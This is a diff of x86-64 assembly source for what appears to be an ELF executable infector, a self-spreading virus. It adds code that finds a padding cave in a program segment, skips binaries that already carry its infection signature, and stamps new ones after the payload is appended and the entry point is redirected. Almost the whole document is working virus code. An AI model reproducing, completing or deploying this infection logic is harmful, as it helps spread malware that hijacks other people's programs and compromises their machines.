@@ -228,7 +228,7 @@ treat_file:
 	%local fd:qword					; long fd;
 	%local filesize:qword				; long filesize;
 	%local mappedfile:qword				; void *mappedfile;
-	%local exec_segment:qword			; struct elf64_phdr *exec_segment;
+	%local signature_segment:qword			; struct elf64_phdr *signature_segment;
 	%local payload_offset:qword			; long payload_offset;
 	%local new_vaddr:qword				; Elf64_addr new_vaddr;
 	%local payload_size:qword			; long payload_size;
@@ -328,12 +328,20 @@ treat_file:
 	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
 	jne .unmap_file					; 	goto .unmap_file
 
-	; TODO: Check if file has signature
-	
+	; Check if file has a signature
+	mov rdi, [mappedfile]				; signature_segment = find_signature_segment(mappedfile);
+	call find_signature_segment			; ...
+	cmp rax, 0					; if (signature_segment == NULL)
+	je .unmap_file					; 	goto .unmap_file
+	mov [signature_segment], rax			; ...
+	mov rdi, [mappedfile]				; if (has_signature(mappedfile, signature_segment) == 1)
+	mov rsi, [signature_segment]			; ...
+	call has_signature				; ...
+	cmp rax, 1					; ...
+	je .unmap_file					; 	goto .unmap_file
 
 	mov rax, [filesize]				; payload_offset = filesize;
 	mov [payload_offset], rax			; ...
-
 	mov rdi, [mappedfile]				; _new_vaddr = get_next_available_vaddr(mappedfile);
 	call get_next_available_vaddr			; ...
 	; TODO Check error
@@ -419,7 +427,10 @@ treat_file:
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
 	
-	; TODO: sign
+	; sign file
+	mov rdi, [mappedfile]				; sign(mappedfile, signature_segment);
+	mov rsi, [signature_segment]			; ...
+	call sign					; ...
 
 .unmap_file:
 	mov rax, SYS_MUNMAP				; _ret = munmap(
@@ -600,16 +611,103 @@ find_note_segment:
 	%pop
 	ret						; return res;
 
-; int has_signature(char const *file_map, elf64_phdr *exec_segment)
-; rax has_signature(rdi file_map, rsi exec_segment);
+;elf64_phdr *find_signature_segment(char const *_file_map)
+;rax find_signature_segment(rdi file_map);
+find_signature_segment:
+	%push context
+	%stacksize flat64
+	%assign %$localsize 0
+
+	%local file_map:qword				; char const *file_map;
+	%local res_header:qword				; elf64_phdr *res_header;
+	%local e_phoff:qword				; long e_phoff;
+	%local e_phentsize:qword			; long e_phentsize;
+	%local e_phnum:qword				; long e_phnum;
+	%local cur_segment_filesz:qword			; long cur_segment_filesz;
+	%local cur_segment_align:qword			; long cur_segment_align;
+
+	; Initializes stack frame
+	push rbp
+	mov rbp, rsp
+	sub rsp, %$localsize
+
+	mov [file_map], rdi				; file_map = _file_map;
+	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
+	mov [e_phoff], rax				; ...
+	xor rax, rax
+	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
+	mov [e_phentsize], rax				; ...
+	xor rax, rax
+	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
+	mov [e_phnum], rax				; ...
+
+	; loop through program headers
+	mov rsi, 0					; i = 0;
+	.begin_phdr_loop:				; while (true) {
+		mov rax, [file_map]			; cur_phdr = file_map
+		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
+		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
+		imul rcx, rsi				; 		...
+		add rax, rcx				; 		...
+		mov [res_header], rax			; res_header = cur_phdr;
+
+		; check segment is not PT_NOTE
+		mov rdi, [res_header]			; if (cur_phdr->p_type == PT_NOTE)
+		add rdi, elf64_phdr.p_type		; ...
+		mov eax, [rdi]				; ...
+		cmp eax, PT_NOTE			; ...
+		je .next_phdr_loop			; 	goto next_phdr_loop;
+
+		; check codecave size
+		mov rdi, [res_header]			; cur_segment_filesz = cur_phdr->p_filesz;
+		add rdi, elf64_phdr.p_filesz		; ...
+		mov rax, [rdi]				; ...
+		mov [cur_segment_filesz], rax		; ...
+		mov rdi, [res_header]			; cur_segment_align = cur_phdr->p_align;
+		add rdi, elf64_phdr.p_align		; ...
+		mov rax, [rdi]				; ...
+		mov [cur_segment_align], rax		; ...
+		mov rax, [cur_segment_filesz]		; cur_segment_filesz%cur_segment_align
+		mov rdi, [cur_segment_align]		; ...
+		xor rdx, rdx				; ...
+		div rdi					; ...
+		sub rdi, rax				; cave = cur_segment_align - cur_segment_filesz%cur_segment_align
+		cmp rdi, len_signature			; if (cave < len_signature)
+		jl .next_phdr_loop			; 	goto next_phdr_loop;
+
+		jmp .found				; goto found;
+
+	.next_phdr_loop:
+		inc rsi					; i++;
+		cmp rsi, [e_phnum]			; if (i == e_phnum)
+		je .not_found				; 	goto not_found;
+		jmp .begin_phdr_loop			; }
+
+	.not_found:
+		xor rax, rax				; res = 0;
+		jmp .end				; goto end
+
+	.found:
+		mov rax, [res_header]			; res = res_header;
+		jmp .end				; goto end
+
+.end:
+	add rsp, %$localsize
+	pop rbp
+	%pop
+	ret						; return res;
+
+
+; int has_signature(char const *file_map, elf64_phdr *segment)
+; rax has_signature(rdi file_map, rsi segment);
 has_signature:
 	push rsi
-	add rsi, elf64_phdr.p_offset			; offset = exec_segment->p_offset;
+	add rsi, elf64_phdr.p_offset			; offset = segment->p_offset;
 	mov rax, [rsi]					; ..
 	add rdi, rax					; file_map += offset;
 	
 	pop rsi
-	add rsi, elf64_phdr.p_filesz			; size = exec_segment->p_filesz;
+	add rsi, elf64_phdr.p_filesz			; size = segment->p_filesz;
 	mov rax, [rsi]					; ..
 	add rdi, rax					; file_map += size;
 
@@ -633,16 +731,16 @@ has_signature:
 		mov rax, 1				; return 1;
 		ret
 
-; void sign(char const *file_map, elf64_phdr *exec_segment)
-; void sign(rdi file_map, rsi exec_segment);
+; void sign(char const *file_map, elf64_phdr *segment)
+; void sign(rdi file_map, rsi segment);
 sign:
 	push rsi
-	add rsi, elf64_phdr.p_offset			; offset = exec_segment->p_offset;
+	add rsi, elf64_phdr.p_offset			; offset = segment->p_offset;
 	mov rax, [rsi]					; ..
 	add rdi, rax					; file_map += offset;
 	
 	pop rsi
-	add rsi, elf64_phdr.p_filesz			; size = exec_segment->p_filesz;
+	add rsi, elf64_phdr.p_filesz			; size = segment->p_filesz;
 	mov rax, [rsi]					; ..
 	add rdi, rax					; file_map += size;
 
